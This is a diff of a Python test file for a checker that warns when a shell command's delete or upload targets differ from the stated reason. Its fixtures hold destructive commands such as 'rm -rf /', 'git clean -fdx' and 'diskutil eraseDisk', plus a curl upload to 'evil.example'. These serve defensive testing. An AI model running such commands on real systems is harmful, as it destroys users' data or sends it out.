@@ -160,23 +160,21 @@ def test_a_file_inside_the_folder_the_words_name_matches() -> None:
     assert gist("rm -f build/*.o", "Clean build/").warn == ""
 
 
-def test_a_glob_matches_the_names_it_covers() -> None:
-    assert gist("rm -f *.log", "Delete debug.log").warn == ""
+def test_a_glob_matches_an_equal_glob_or_the_extension_it_ends_in() -> None:
+    assert gist("rm -f *.log", "Delete *.log").warn == ""
+    assert gist("rm -f *.log", "Delete the .log files").warn == ""
     assert gist("rm -f *.log", "Delete notes.tmp").warn == "delete_target"
 
 
-def test_one_matching_target_among_several_is_enough() -> None:
-    assert gist("rm -f a.tmp b.tmp", "Delete b.tmp").warn == ""
-
-
-def test_a_bare_word_that_is_one_of_the_targets_matches() -> None:
-    assert gist("rm -rf build dist", "Delete notes.tmp and the build folder").warn == ""
+def test_a_bare_word_that_is_the_target_matches() -> None:
+    assert gist("rm -rf build", "Delete notes.tmp and the build folder").warn == ""
+    assert gist("rm -rf build dist", "Delete the build/ and dist folders").warn == ""
 
 
 def test_a_target_melo_cannot_read_is_not_compared() -> None:
     assert gist('rm -rf "$DIR"', "Delete notes.tmp").warn == ""
     assert gist("rm -rf $(mktemp -d)", "Delete notes.tmp").warn == ""
-    assert gist("rm -rf .", "Delete notes.tmp").warn == ""
+    assert gist('rm -rf "$DIR"/*', "Delete notes.tmp").warn == ""
     code = "import shutil\nshutil.rmtree(path)"
     assert script(code, "Delete notes.tmp").warn == ""
 
@@ -287,8 +285,17 @@ def test_other_senders_name_their_host() -> None:
 
 def test_a_cloud_bucket_is_named_by_its_bucket() -> None:
     command = "aws s3 cp r.pdf s3://backup-bucket/r.pdf"
-    assert gist(command, "Upload to backup-bucket.example.com").warn == ""
+    assert gist(command, "Upload to s3://backup-bucket/").warn == ""
     assert gist(command, "Upload to files.example.com").warn == "send_out_target"
+
+
+def test_a_name_without_a_dot_is_not_a_part_of_a_domain() -> None:
+    """A bucket or remote called like a label of the named domain is not that domain."""
+    command = "aws s3 cp r.pdf s3://example/r.pdf"
+    assert gist(command, "Upload to backup.example.com").warn == "send_out_target"
+    assert gist("rclone copy r.pdf com:", "Upload to files.example.com").warn == (
+        "send_out_target"
+    )
 
 
 # ── The kinds never mix ──
@@ -347,3 +354,194 @@ def test_the_git_words_do_not_cover_a_delete_by_rm() -> None:
         gist("git checkout -- . && rm -rf build", "Revert my local changes").warn
         == "delete"
     )
+
+
+@pytest.mark.parametrize(
+    ("command", "why"),
+    [
+        ("git clean -fdx", "Restore the repo to how it was"),
+        ("git clean -fdx", "Undo my changes"),
+        ("git clean -fd", "Clear the untracked files"),
+        ("git clean -fd", "Check out the main branch"),
+        ("git clean -fdx", "Stash my work"),
+        ("git clean -f", "Reject the generated output"),
+        ("git reset --hard", "Undo the last edit"),
+        ("git reset --hard origin/main", "Check out origin/main"),
+        ("git clean -fdx && git checkout -- .", "Revert my local changes"),
+        ("git checkout -- . && rm -rf build", "Revert my local changes"),
+        ("git clean -fd -enode_modules", "List the untracked files"),
+        ("git clean -fd -e.env", "List the untracked files"),
+        ("git clean -nd", "List the untracked files"),
+    ],
+)
+def test_git_clean_and_reset_hard_keep_the_base_delete_warning(
+    command: str, why: str
+) -> None:
+    """The honest-words exception is only for commands that were not a delete before."""
+    review = ActionReview("high", ("delete",), ("Discards uncommitted changes.",))
+    assert gist(command, why, review).warn == "delete"
+
+
+def test_the_git_words_do_not_cover_a_discard_beside_another_command() -> None:
+    review = ActionReview("high", ("delete",), ("Discards uncommitted changes.",))
+    assert gist(
+        "git checkout -- . && ./cleanup.sh", "Revert my changes", review
+    ).warn == ("delete")
+    harmless = "cd sub && git status && git checkout -- ."
+    assert gist(harmless, "Revert my changes", review).warn == ""
+
+
+def test_the_git_words_do_not_cover_a_delete_the_rules_found_elsewhere() -> None:
+    """A category the code does not show is a reason to keep the plain warning."""
+    review = ActionReview("high", ("delete", "system"), ("Does more.",))
+    assert gist("git checkout -- .", "Revert my changes", review).warn == "delete"
+
+
+@pytest.mark.parametrize(
+    "why",
+    ["Revert my local changes", "Restore the files", "Undo the edits", "还原本地修改"],
+)
+def test_an_honest_description_of_a_git_discard_still_does_not_warn(why: str) -> None:
+    review = ActionReview("high", ("delete",), ("Discards uncommitted changes.",))
+    assert gist("git checkout -- .", why, review).warn == ""
+    assert gist("git restore --worktree .", why, review).warn == ""
+    assert gist("git stash drop", why, review).warn == ""
+
+
+# ── Every target the code acts on has to be named ──
+
+
+def test_every_deleted_target_must_be_named() -> None:
+    found = gist("rm -rf src build", "Delete build/")
+    assert found.warn == "delete_target"
+    assert found.warn_params["target"] == "src"
+    code = "import os, shutil\nos.remove('notes.md')\nshutil.rmtree('src')"
+    other = script(code, "Delete notes.md")
+    assert other.warn == "delete_target"
+    assert other.warn_params["target"] == "src"
+
+
+def test_only_the_targets_that_are_not_named_are_listed() -> None:
+    found = gist("rm -rf a b c d e", "Delete the 'c' folder and a.tmp")
+    assert found.warn == "delete_target"
+    assert found.warn_params["target"] == "a, b, d, …"
+    found = gist("rm -rf a b c d e", "Delete b and the 'c' folder, a.tmp")
+    assert found.warn_params["target"] == "a, d, e"  # the bare b is spelt out
+
+
+def test_every_target_named_means_no_warning() -> None:
+    assert gist("rm -rf build dist", "Delete build/ and dist/").warn == ""
+    assert gist("rm -f a.tmp b.tmp", "Delete a.tmp and b.tmp").warn == ""
+
+
+def test_every_host_sent_to_has_to_be_named() -> None:
+    command = "curl -T r.pdf https://example.com/up https://evil.example/up"
+    found = gist(command, "Upload r.pdf to example.com")
+    assert found.warn == "send_out_target"
+    assert found.warn_params["target"] == "evil.example"
+
+
+@pytest.mark.parametrize(
+    ("command", "why"),
+    [
+        ("rm -rf ~/Documents", "Delete old.txt in Documents"),
+        ("rm -rf src", "Delete the old.tmp file in the src tree"),
+        ("rm -rf src", "Delete old.tmp from the src folder"),
+        ("rm -rf src", "删除 src里的old.tmp"),
+        ("rm -rf build", "Delete out.o inside build"),
+    ],
+)
+def test_a_file_in_a_bare_folder_name_still_warns_when_the_folder_goes(
+    command: str, why: str
+) -> None:
+    assert gist(command, why).warn == "delete_target"
+
+
+@pytest.mark.parametrize(
+    ("command", "why"),
+    [
+        ("rm -rf build", "Delete notes.tmp and the build folder"),
+        ("rm -rf build dist", "Delete build/ and the dist folder"),
+        ("rm -rf src", "Delete notes.tmp, then src"),
+        ("rm -rf 缓存", "删除 notes.tmp 和 缓存"),
+    ],
+)
+def test_a_bare_word_that_is_the_thing_deleted_still_matches(
+    command: str, why: str
+) -> None:
+    assert gist(command, why).warn == ""
+
+
+@pytest.mark.parametrize(
+    ("command", "why"),
+    [
+        ("rm -rf src/*", "Delete src/a.py"),
+        ("rm -rf ~/projects/*", "Delete projects/app/build/tmp.log"),
+        ("rm -f *.*", "Delete notes.md"),
+        ("rm -f [!.]*", "Delete notes.md"),
+        ("rm -f *.log", "Delete debug.log"),
+        ("rm -rf build/*", "Delete build/tmp.log"),
+    ],
+)
+def test_a_glob_target_warns_against_one_named_file(command: str, why: str) -> None:
+    assert gist(command, why).warn == "delete_target"
+
+
+@pytest.mark.parametrize(
+    ("command", "why"),
+    [
+        ("rm -rf src/*", "Delete everything in src/"),
+        ("rm -rf src/*", "Delete src/*"),
+        ("rm -f build/*.o", "Clean the build/ folder"),
+        ("rm -f *.log", "Delete the .log files"),
+        ("rm -f debug.log", "Delete '*.log'"),
+    ],
+)
+def test_a_glob_target_matches_the_folder_it_lists_or_an_equal_glob(
+    command: str, why: str
+) -> None:
+    assert gist(command, why).warn == ""
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["rm -rf ./*", "rm -rf ~", "rm -rf /", "rm -rf ..", "rm -rf build/..", "rm -rf ."],
+)
+def test_a_broad_target_warns_against_a_named_file(command: str) -> None:
+    found = gist(command, "Delete build/tmp.log")
+    assert found.warn == "delete_target"
+    assert found.warn_params["target"] == command.removeprefix("rm -rf ")
+
+
+def test_a_broad_target_after_cd_is_not_compared() -> None:
+    assert gist("cd build && rm -rf *", "Delete build/tmp.log").warn == ""
+    assert gist("cd build && rm -rf .", "Delete build/tmp.log").warn == ""
+
+
+def test_a_target_built_at_run_time_is_still_not_compared() -> None:
+    assert gist('rm -rf "$DIR"', "Delete notes.tmp").warn == ""
+    assert gist('rm -rf "$DIR"/*', "Delete notes.tmp").warn == ""
+    assert gist("rm -rf $(mktemp -d)", "Delete notes.tmp").warn == ""
+
+
+def test_a_full_width_spelling_names_the_same_thing() -> None:
+    assert gist("rm -rf build", "Delete ｎｏｔｅｓ．ｔｍｐ").warn == "delete_target"
+    assert gist("rm -rf notes.tmp", "Delete ｎｏｔｅｓ．ｔｍｐ").warn == ""
+
+
+def test_a_scheme_name_is_not_run_together_with_what_follows() -> None:
+    """A long run of letters before ``://`` is read in one pass."""
+    assert gist("rm -rf build", "Delete " + "a" * 5000 + "://").warn in ("", "delete")
+
+
+def test_a_disk_erase_is_compared_by_the_disk_it_names() -> None:
+    found = gist("diskutil eraseDisk APFS Backup disk2", "Erase the build/ folder")
+    assert found.warn == "delete_target"
+    assert found.warn_params["target"] == "disk2"
+    assert gist("diskutil eraseDisk APFS Backup disk2", "Erase disk2").warn == ""
+
+
+def test_stashing_is_not_dropping_a_stash() -> None:
+    review = ActionReview("high", ("delete",), ("Deletes stashed work.",))
+    assert gist("git stash drop", "Stash my work for later", review).warn == "delete"
+    assert gist("git stash drop", "Drop the old stash", review).warn == ""
